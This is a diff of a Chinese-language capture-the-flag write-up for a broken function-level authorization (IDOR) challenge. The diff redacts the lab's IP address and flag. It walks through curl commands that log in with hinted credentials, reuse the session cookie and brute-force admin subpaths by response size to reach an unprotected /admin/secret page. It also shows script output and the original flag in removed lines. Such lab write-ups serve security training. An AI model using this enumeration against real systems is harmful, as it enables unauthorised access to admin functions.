@@ -1,7 +1,7 @@
 # Q31 · IDOR 管理后台垂直越权 (BFLA)
 
-> 实测: `http://47.120.76.57:34939/` （题面写 34938 但实际开放 34939）
-> FLAG: `TOGOGO-flag{d1d63e7f-8355-47f2-97f0-3686bb69be93}`
+> 实测: `http://目标地址/` （题面写 34938 但实际开放 34939）
+> FLAG: `TOGOGO-flag{}`
 
 ## 一句话原理
 
@@ -15,7 +15,7 @@
 ```bash
 curl -s -c /tmp/q31.ck -X POST \
   -d "username=user&password=user123" \
-  http://47.120.76.57:34939/login -o /dev/null
+  http://目标地址/login -o /dev/null
 ```
 
 `user/user123` 来自登录框 placeholder 提示。`-c` 保存 PHPSESSID。
@@ -23,7 +23,7 @@ curl -s -c /tmp/q31.ck -X POST \
 ### 2. 撞 `/admin`（确认硬壁垒）
 
 ```bash
-curl -s -b /tmp/q31.ck http://47.120.76.57:34939/admin
+curl -s -b /tmp/q31.ck http://目标地址/admin
 # 输出: 403 · 你不是管理员   （25 字节）
 ```
 
@@ -32,7 +32,7 @@ curl -s -b /tmp/q31.ck http://47.120.76.57:34939/admin
 ```bash
 # 首页 fallback (登录后未授权访问的默认响应)
 curl -s -b /tmp/q31.ck -o /dev/null -w "%{size_download}\n" \
-  http://47.120.76.57:34939/
+  http://目标地址/
 # 165
 ```
 
@@ -46,7 +46,7 @@ for p in admin/console admin/manage admin/users admin/export \
          admin/logs admin/dashboard admin/config; do
   r=$(curl -s -b /tmp/q31.ck -o /dev/null \
       -w "%{http_code}|%{size_download}" \
-      http://47.120.76.57:34939/$p)
+      http://目标地址/$p)
   [[ "${r#*|}" != "165" && "${r#*|}" != "25" ]] && echo "[HIT] $r /$p"
 done
 ```
@@ -60,7 +60,7 @@ done
 ### 5. 读 flag
 
 ```bash
-curl -s -b /tmp/q31.ck http://47.120.76.57:34939/admin/secret
+curl -s -b /tmp/q31.ck http://目标地址/admin/secret
 # <h2>系统机密</h2><pre>TOGOGO-flag{...}</pre>
 ```
 
@@ -120,7 +120,7 @@ python main.py
 [+] 基线: 首页 size=165 | /admin -> 403 size=25
 [*] 爆破 20 个 admin 子路径...
     [HIT] /admin/secret -> 200 size=81
-[*] FLAG = TOGOGO-flag{d1d63e7f-8355-47f2-97f0-3686bb69be93}
+[*] FLAG = TOGOGO-flag{}
 ```
 
 ## 收获
